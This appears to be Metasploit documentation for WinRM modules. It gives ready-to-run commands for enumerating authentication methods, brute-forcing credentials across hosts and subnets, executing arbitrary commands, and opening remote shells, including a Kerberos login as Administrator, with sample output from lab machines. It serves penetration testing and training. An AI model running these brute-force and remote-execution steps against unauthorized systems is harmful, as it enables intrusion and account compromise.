## WinRM Workflows
Either with the modern inline option support:
```
use scanner/winrm/winrm_auth_methods

run http://192.168.123.139:5985
run https://192.168.123.139:5986
```

Or by manually setting options:
```
use scanner/winrm/winrm_auth_methods
set RHOST 192.168.123.139
set RPORT 5985
set SSL false
run
```

There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:
```msf
msf6 > search winrm
```

### Lab Environment
WinRM over HTTPS requires the creation of a Server Authenticating Certificate, as well as enabling the transport mode:
```
winrm quickconfig -transport:https
```

### Authentication Enumeration
Enumerate WinRm authentication mechanisms:
```
use scanner/winrm/winrm_auth_methods
run http://192.168.123.139:5985
run https://192.168.123.139:5986
```

Example:
```msf
msf6 auxiliary(scanner/winrm/winrm_auth_methods) > run http://192.168.123.139:5985

[+] 192.168.123.139:5985: Negotiate protocol supported
[+] 192.168.123.139:5985: Kerberos protocol supported
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### WinRM Bruteforce
Brute-force host with known user and password list:
```
use scanner/winrm/winrm_login
run https://known_user@192.168.222.1:5986 threads=50 pass_file=./wordlist.txt
```

Brute-force credentials:
```
use scanner/winrm/winrm_login
run http://192.168.123.139:5985 threads=50 user_file=./users.txt pass_file=./wordlist.txt
```

Brute-force credentials in a subnet:
```
use scanner/winrm/winrm_login
run cidr:/24:http://user:pass@192.168.222.0:5985 threads=50
run cidr:/24:http://user@192.168.222.0:5985 threads=50 pass_file=./wordlist.txt
```

### WinRM CMD
To execute arbitrary commands against a windows target:
```
use scanner/winrm/winrm_cmd
run http://user:pass@192.168.123.139:5985 cmd='whoami; ipconfig; systeminfo'
```

### WinRM Login Session
If you have valid credentials the `scanner/winrm/winrm_login` module will open a Metasploit session for you:
```
use scanner/winrm/winrm_login
run http://user:pass@192.168.123.139:5985
```

Example:
```msf
msf6 auxiliary(scanner/winrm/winrm_login) > run http://user:pass@192.168.123.139:5985

[!] No active DB -- Credential data will not be saved!
[+] 192.168.123.139:5985 - Login Successful: WORKSTATION\user:pass
[*] Command shell session 7 opened (192.168.123.1:58673 -> 192.168.123.139:5985 ) at 2022-04-23 02:36:34 +0100
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/winrm/winrm_login) > sessions -i -1
[*] Starting interaction with 7...

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\user>
```

### Kerberos Authentication
Open a WinRM session:
```msf
msf6 > use auxiliary/scanner/winrm/winrm_login
msf6 auxiliary(scanner/winrm/winrm_login) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd winrm::auth=kerberos domaincontrollerrhost=192.168.123.13 winrm::rhostname=dc3.demo.local domain=demo.local

[+] 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:5985   - TGT MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120604_default_192.168.123.13_mit.kerberos.cca_451736.bin
[+] 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:5985   - TGS MIT Credential Cache ticket saved to /Users/user/.msf4/loot/20230118120604_default_192.168.123.13_mit.kerberos.cca_889546.bin
[+] 192.168.123.13:88 - Received a valid delegation TGS-Response
[+] 192.168.123.13:88 - Received AP-REQ. Extracting session key...
[+] 192.168.123.13:5985 - Login Successful: demo.local\Administrator:p4$$w0rd
[*] Command shell session 1 opened (192.168.123.1:50722 -> 192.168.123.13:5985) at 2023-01-18 12:06:05 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/winrm/winrm_login) > sessions -i -1
[*] Starting interaction with 1...

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```

